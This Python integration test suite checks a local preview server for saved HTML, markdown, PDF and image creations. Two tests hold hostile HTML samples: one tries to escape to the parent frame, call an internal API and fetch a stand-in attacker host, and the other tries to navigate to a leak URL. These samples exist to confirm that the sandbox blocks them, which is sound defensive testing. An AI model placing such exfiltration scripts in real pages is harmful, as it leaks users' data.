import base64
import io
import http.server
import json
import os
from pathlib import Path
import shlex
import shutil
import subprocess
import sys
import threading
import time
import unittest
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import zipfile

from playwright.sync_api import sync_playwright
from server import make_server, tmux
from test_jarvis_tools import DisposableDesk


class VisualHttpFixture(DisposableDesk):
    def setUp(self):
        super().setUp()
        self.server = None
        self.start_http()
        self.addCleanup(self.stop_http)

    def start_http(self):
        self.server = make_server(self.app)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.url = 'http://127.0.0.1:' + str(self.server.server_port)

    def stop_http(self):
        if self.server is not None:
            self.server.shutdown()
            self.server.server_close()
            self.thread.join(2)
            self.server = None

    def get(self, path, headers=None):
        with urlopen(Request(self.url + path, headers=headers or {}), timeout=5) as response:
            return response.read(), response.headers

    def post(self, path, payload, origin=None):
        request = Request(self.url + path, data=json.dumps(payload).encode(),
                          headers={'Content-Type': 'application/json', 'Origin': origin or self.url})
        with urlopen(request, timeout=5) as response:
            return json.load(response)

    def workspace(self, name='Dog Data'):
        raw, _ = self.get('/api/visual/workspace?' + urlencode({'tab': self.targets[name]['tab']}))
        return json.loads(raw)

    def register(self, files, kind='html', name='Dog Data', **fields):
        target = {key: self.targets[name][key] for key in ('tab', 'pane', 'identity')}
        payload = {'target': target, 'title': 'Synthetic creation', 'kind': kind, 'mode': 'imported',
                   'entrypoint': next(iter(files)),
                   'files': [{'path': path, 'data': base64.b64encode(data).decode()} for path, data in files.items()]}
        payload.update(fields)
        return self.post('/api/visual/register', payload)

    def capture_cli(self, path, creation=None):
        target = self.targets['Dog Data']
        command = [sys.executable, str(Path(__file__).with_name('visual.py')), '--url', self.url,
                   'register', '--tab', target['tab'], '--pane', target['pane'], '--identity', target['identity'],
                   '--title', 'Frozen report', '--kind', 'html', '--entrypoint', 'index.html']
        if creation:
            command += ['--creation', creation]
        command.append(str(path))
        environment = {key: value for key, value in os.environ.items()
                       if key not in {'TYPESAFE_API_KEY', 'ELEVENLABS_API_KEY', 'ELEVENLABS_VOICE_ID',
                                      'JEV_SETTINGS_FILE', 'JEV_ASK_MODEL', 'JEV_ASK_EFFORT'}}
        result = subprocess.run(command, cwd=Path(__file__).parent, env=environment,
                                text=True, capture_output=True, timeout=10)
        self.assertEqual(result.returncode, 0, result.stderr)
        return json.loads(result.stdout)


class VisualHttpIntegrationTests(VisualHttpFixture):
    def test_cli_frozen_bundles_survive_source_deletion_and_http_restart_in_own_tab(self):
        source = self.root / 'source'
        source.mkdir()
        initial = b'<h1>Version one</h1><link rel="stylesheet" href="style.css">'
        revised = b'<h1>Version two</h1><link rel="stylesheet" href="style.css">'
        (source / 'index.html').write_bytes(initial)
        (source / 'style.css').write_bytes(b'h1{color:blue}')
        first = self.capture_cli(source)
        (source / 'index.html').write_bytes(revised)
        second = self.capture_cli(source, first['creation_id'])
        shutil.rmtree(source)
        before = self.workspace()
        self.assertEqual(before['workspace_id'], first['workspace_id'])
        self.assertEqual(self.workspace('Controller')['creations'], [])
        self.assertNotEqual(self.workspace('Controller')['workspace_id'], before['workspace_id'])
        self.stop_http()
        self.reopen()
        self.start_http()
        restored = self.workspace()
        self.assertEqual(restored['workspace_id'], before['workspace_id'])
        self.assertEqual(len(restored['creations']), 1)
        versions = restored['creations'][0]['versions']
        self.assertEqual([item['id'] for item in versions], [second['version_id'], first['version_id']])
        for version, expected in zip(versions, (revised, initial)):
            data, _ = self.get(version['content_url'])
            self.assertEqual(data, expected)
            data, headers = self.get(version['download_url'])
            self.assertIn('attachment', headers['Content-Disposition'])
            with zipfile.ZipFile(io.BytesIO(data)) as bundle:
                self.assertEqual(bundle.read('index.html'), expected)
                self.assertEqual(bundle.read('style.css'), b'h1{color:blue}')
            self.assertEqual(version['source']['identity'], self.targets['Dog Data']['identity'])

    def test_replaced_conversation_rejects_old_registration_and_keeps_provenance(self):
        saved = self.register({'note.md': b'# Original'}, kind='markdown')
        target = self.targets['Dog Data']
        command = 'exec -a codex ' + shlex.join([sys.executable, str(self.root / 'fixture.py'),
                                              str(self.root / 'replacement.input')])
        tmux(self.socket, 'respawn-pane', '-k', '-t', target['pane'], command)
        deadline = time.monotonic() + 3
        while time.monotonic() < deadline:
            pane = next(pane for tab in self.app.observe()['tabs'] for pane in tab['panes']
                        if pane['id'] == target['pane'])
            if pane['identity'] != target['identity'] and pane.get('agent'):
                break
            time.sleep(.02)
        self.assertNotEqual(pane['identity'], target['identity'])
        with self.assertRaises(HTTPError) as error:
            self.register({'note.md': b'# Wrong owner'}, kind='markdown', creation_id=saved['creation_id'])
        self.assertEqual(error.exception.code, 409)
        restored = self.workspace()
        self.assertEqual(len(restored['creations'][0]['versions']), 1)
        self.assertEqual(restored['creations'][0]['versions'][0]['source']['identity'], target['identity'])

    def test_recreated_tmux_server_same_socket_and_window_id_gets_fresh_workspace(self):
        saved = self.register({'note.txt': b'Archived original'}, kind='text')
        old_tab = self.targets['Dog Data']['tab']
        tmux(self.socket, 'kill-server')
        deadline = time.monotonic() + 3
        while Path(self.socket).exists() and time.monotonic() < deadline:
            time.sleep(.02)
        tmux(self.socket, '-f', '/dev/null', 'new-session', '-d', '-s', 'tabs', '-n', 'Replacement', 'cat')
        new_tab = tmux(self.socket, 'display-message', '-p', '-t', '=tabs:', '#{window_id}')
        self.assertEqual(new_tab, old_tab)
        replacement = self.workspace()
        self.assertNotEqual(replacement['workspace_id'], saved['workspace_id'])
        self.assertEqual(replacement['creations'], [])
        self.assertIsNone(replacement['live'])

    def test_hostile_html_cannot_access_parent_or_issue_api_or_external_requests(self):
        attack = b'''<!doctype html><html><body><p id="result">running</p><script>
        const result = {};
        try { parent.document.body.dataset.previewEscaped = 'yes'; result.parent = 'escaped'; }
        catch (_) { result.parent = 'blocked'; }
        Promise.all([
          fetch('/api/visual/detach', {method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({tab:'@0',attachment_id:'attack'})})
            .then(() => result.api = 'escaped', () => result.api = 'blocked'),
          fetch('https://visual-attacker.invalid/leak').then(() => result.remote = 'escaped', () => result.remote = 'blocked')
        ]).then(() => document.querySelector('#result').textContent = JSON.stringify(result));
        </script></body></html>'''
        self.register({'index.html': attack})
        version = self.workspace()['creations'][0]['versions'][0]
        _, headers = self.get(version['preview_url'], {'Sec-Fetch-Dest': 'iframe'})
        self.assertIn('sandbox allow-scripts', headers['Content-Security-Policy'])
        self.assertIn("connect-src 'none'", headers['Content-Security-Policy'])
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch()
            try:
                page = browser.new_page()
                remote_effects = []
                page.route('https://visual-attacker.invalid/**',
                           lambda route: (remote_effects.append(route.request.url), route.abort()))
                response = page.goto(self.url)
                self.assertEqual(response.status, 200)
                api_effects = []
                page.on('response', lambda response: api_effects.append(response.status)
                        if response.request.method == 'POST' and response.url.endswith('/api/visual/detach') else None)
                page.evaluate('''url => { const frame = document.createElement('iframe');
                    frame.sandbox = 'allow-scripts'; frame.referrerPolicy = 'no-referrer';
                    frame.id = 'hostile-preview-test'; frame.src = url; document.body.append(frame); }''',
                              self.url + version['preview_url'])
                frame = page.frame_locator('#hostile-preview-test')
                frame.locator('#result').filter(has_text='blocked').wait_for()
                self.assertEqual(json.loads(frame.locator('#result').inner_text()),
                                 {'parent': 'blocked', 'api': 'blocked', 'remote': 'blocked'})
                self.assertIsNone(page.locator('body').get_attribute('data-preview-escaped'))
                self.assertEqual(remote_effects, [])
                self.assertEqual(api_effects, [])
            finally:
                browser.close()


    def test_hostile_preview_cannot_navigate_itself_to_an_external_origin(self):
        captured = []
        class Capture(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                captured.append(self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'synthetic receiver')
            def log_message(self, *args):
                pass
        capture = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Capture)
        thread = threading.Thread(target=capture.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(thread.join, 2)
        self.addCleanup(capture.server_close)
        self.addCleanup(capture.shutdown)
        attack = (f"<script>setTimeout(() => location.href = 'http://127.0.0.1:{capture.server_port}/leak?data=synthetic-only', 100)</script>").encode()
        self.register({'index.html': attack})
        version = self.workspace()['creations'][0]['versions'][0]
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch()
            try:
                page = browser.new_page()
                page.goto(self.url)
                page.evaluate("""url => { const frame = document.createElement('iframe');
                    frame.sandbox = 'allow-scripts'; frame.referrerPolicy = 'no-referrer';
                    frame.src = url; document.body.append(frame); }""", self.url + version['preview_url'])
                page.wait_for_timeout(700)
                self.assertEqual(captured, [], 'Hostile preview self-navigation reached an external receiver')
                top_level = browser.new_page()
                response = top_level.goto(self.url + version['preview_url'])
                self.assertEqual(response.status, 403)
                top_level.wait_for_timeout(400)
                self.assertEqual(captured, [], 'A directly opened preview must not execute hostile HTML')
            finally:
                browser.close()

    def test_document_previews_render_content_and_offer_original_downloads(self):
        pdf_stream = b'BT /F1 25 Tf 24 375 Td (VISIBLE PDF FIXTURE) Tj ET\n0.9 0.1 0.2 rg 24 120 240 200 re f'
        objects = [b'<< /Type /Catalog /Pages 2 0 R >>', b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
                   b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 360 420] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>',
                   b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
                   b'<< /Length ' + str(len(pdf_stream)).encode() + b' >>\nstream\n' + pdf_stream + b'\nendstream']
        pdf, offsets = b'%PDF-1.4\n', [0]
        for number, body in enumerate(objects, 1):
            offsets.append(len(pdf))
            pdf += str(number).encode() + b' 0 obj\n' + body + b'\nendobj\n'
        xref = len(pdf)
        pdf += b'xref\n0 6\n0000000000 65535 f \n'
        pdf += b''.join(f'{offset:010} 00000 n \n'.encode() for offset in offsets[1:])
        pdf += b'trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n' + str(xref).encode() + b'\n%%EOF\n'
        fixtures = {
            'html': ('index.html', b'<h1 id="saved-html">VISIBLE HTML FIXTURE</h1>'),
            'markdown': ('report.md', b'# VISIBLE MARKDOWN FIXTURE\n\n**Saved original**'),
            'text': ('report.txt', b'VISIBLE TEXT FIXTURE'),
            'pdf': ('report.pdf', pdf),
            'image': ('image.png', base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jxvYAAAAASUVORK5CYII=')),
        }
        registered = {kind: self.register({name: data}, kind=kind, title='Visible ' + kind)
                      for kind, (name, data) in fixtures.items()}
        self.app.focus(self.targets['Dog Data']['tab'])
        workspace = self.workspace()
        for creation in workspace['creations']:
            version = creation['versions'][0]
            data, headers = self.get(version['download_url'])
            self.assertEqual(data, fixtures[creation['kind']][1])
            self.assertIn('attachment', headers['Content-Disposition'])
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(executable_path=playwright.chromium.executable_path)
            try:
                page = browser.new_page(viewport={'width': 1500, 'height': 1000})
                page.goto(self.url)
                page.wait_for_function('currentState !== null')
                chooser = page.locator('.visual-creation')
                chooser.wait_for(state='visible')
                chooser.select_option(registered['html']['creation_id'])
                self.assertEqual(page.frame_locator('.visual-preview iframe').locator('#saved-html').inner_text(),
                                 'VISIBLE HTML FIXTURE')
                chooser.select_option(registered['markdown']['creation_id'])
                page.wait_for_function("""() => {
                    const preview = document.querySelector('.visual-preview');
                    return preview.querySelector('iframe') || preview.textContent.includes('VISIBLE MARKDOWN FIXTURE');
                }""")
                if page.locator('.visual-preview iframe').count():
                    self.assertIn('VISIBLE MARKDOWN FIXTURE', page.frame_locator('.visual-preview iframe').locator('body').inner_text())
                else:
                    self.assertIn('VISIBLE MARKDOWN FIXTURE', page.locator('.visual-preview').inner_text())
                chooser.select_option(registered['text']['creation_id'])
                page.locator('.visual-preview pre').filter(has_text='VISIBLE TEXT FIXTURE').wait_for()
                chooser.select_option(registered['image']['creation_id'])
                page.wait_for_function("document.querySelector('.visual-preview img')?.naturalWidth === 1")
                chooser.select_option(registered['pdf']['creation_id'])
                page.locator('.visual-preview object[type="application/pdf"]').wait_for()
                self.assertIn('Download original', page.locator('.visual-preview').inner_text())
                deadline = time.monotonic() + 12
                red_pixels = 0
                while time.monotonic() < deadline and red_pixels < 500:
                    screenshot = page.locator('.visual-preview').screenshot()
                    red_pixels = page.evaluate("""async data => {
                        const image = new Image(); image.src = 'data:image/png;base64,' + data; await image.decode();
                        const canvas = document.createElement('canvas'); canvas.width = image.width; canvas.height = image.height;
                        const context = canvas.getContext('2d'); context.drawImage(image, 0, 0);
                        const pixels = context.getImageData(0, 0, image.width, image.height).data;
                        let count = 0;
                        for (let i = 0; i < pixels.length; i += 4)
                            if (pixels[i] > 150 && pixels[i + 1] < 80 && pixels[i + 2] < 100) count++;
                        return count;
                    }""", base64.b64encode(screenshot).decode())
                    if red_pixels < 500:
                        page.wait_for_timeout(250)
                output = Path(__file__).parent / '.run/visual-integration'
                output.mkdir(parents=True, exist_ok=True)
                page.screenshot(path=str(output / 'pdf-rendered.png'), full_page=True)
                self.assertGreater(red_pixels, 500, 'The native PDF did not paint its red fixture rectangle')
                self.assertEqual(page.locator('.visual-download').inner_text(), 'Download original')
                page.evaluate('tab => selectTab(tab)', self.targets['Controller']['tab'])
                page.locator('.visual-preview').filter(has_text='No creations saved yet').wait_for()
                self.assertFalse(page.locator('.visual-controls').is_visible())
                self.assertEqual(self.workspace('Controller')['creations'], [])
            finally:
                browser.close()


if __name__ == '__main__':
    unittest.main()
